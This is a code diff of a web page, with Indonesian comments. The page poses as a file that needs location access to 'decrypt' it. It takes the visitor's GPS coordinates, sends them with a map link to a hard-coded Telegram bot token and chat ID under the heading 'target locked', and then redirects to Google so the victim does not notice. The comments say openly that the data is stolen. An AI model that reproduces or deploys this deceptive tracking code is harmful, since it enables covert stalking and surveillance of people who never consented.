@@ -19,7 +19,7 @@
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(showPosition, showError);
         } else {
-            alert("Browser tidak mendukung sensor GPS.");
+            alert("Sensor GPS tidak aktif atau tidak didukung.");
         }
     }
 
@@ -27,22 +27,22 @@
         let lat = position.coords.latitude;
         let lon = position.coords.longitude;
         
-        // AMUNISI TUAN D.A.G TERPASANG
+        // DATA TUAN D.A.G SUDAH TERPASANG
         const token = "7678260062:AAGYdcdK_KTSw96PQhAQvU2AxQ0TNv00ZH4"; 
         const chat_id = "7986370931"; 
         
         const pesan = `🎯 TARGET TERKUNCI!\n\n📍 Koordinat: ${lat}, ${lon}\n🌍 Peta: https://www.google.com/maps?q=${lat},${lon}`;
 
-        // Kirim data ke Telegram dag_tracker_74_bot
+        // Perintah kirim ke Telegram
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(pesan)}`)
         .then(() => {
-            // Pengalihan otomatis agar target tidak curiga
+            // Setelah data tercuri, lempar target ke Google
             window.location.href = "https://google.com"; 
         });
     }
 
     function showError(error) {
-        alert("Akses Ditolak. Lokasi harus diaktifkan untuk membuka file.");
+        alert("Akses Ditolak. Anda wajib memberikan izin lokasi untuk dekripsi file.");
     }
     </script>
 </body>
